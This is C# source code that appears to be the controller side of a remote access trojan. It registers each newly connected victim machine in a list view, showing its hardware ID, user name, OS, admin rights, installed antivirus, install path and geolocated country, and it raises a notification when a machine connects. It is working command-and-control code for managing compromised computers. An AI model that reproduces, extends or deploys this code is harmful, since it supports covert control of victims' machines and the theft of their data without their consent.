using System;
using Server.MessagePack;
using Server.Connection;
using cGeoIp;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;

namespace Server.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockBlocked)
                {
                    try
                    {
                        if (Settings.Blocked.Count > 0)
                        {
                            if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                            {
                                client.Disconnected();
                                return;
                            }
                            else if (Settings.Blocked.Contains(client.Ip))
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                    }
                    catch { }
                }

                client.LV = new ListViewItem
                {
                    Tag = client,
                    Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1]),
                };
                string[] ipinf;
                try
                {
                    ipinf = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                    client.LV.SubItems.Add(ipinf[1]);
                    try
                    {
                        client.LV.ImageKey = ipinf[2] + ".png";
                    }
                    catch { }
                }
                catch
                {
                    client.LV.SubItems.Add("??");
                }

                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                try
                {
                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Installed").AsString).ToLocalTime().ToString());
                }
                catch
                {
                    try
                    {
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Installed").AsString);
                    }
                    catch
                    {
                    client.LV.SubItems.Add("??");
                    }
                }
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
                client.LV.SubItems.Add("0000 MS");
                try
                {
                    client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
                }
                catch
                {
                    client.LV.SubItems.Add("...");
                }
                client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                client.LV.UseItemStyleForSubItems = false;
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    lock (Settings.LockListviewClients)
                    {
                        Program.form1.listView1.Items.Add(client.LV);
                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                        Program.form1.lv_act.Width = 500;
                    }

                    if (Properties.Settings.Default.Notification == true)
                    {
                        Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
{client.Ip} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
                        Program.form1.notifyIcon1.ShowBalloonTip(100);
                    }

                    new HandleLogs().Addmsg($"Client {client.Ip} connected", Color.Green);
                }));
            }
            catch { }
        }

        public void Received(Clients client)
        {
            try
            {
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                        client.LV.ForeColor = Color.Empty;
            }
            catch { }
        }
    }
}
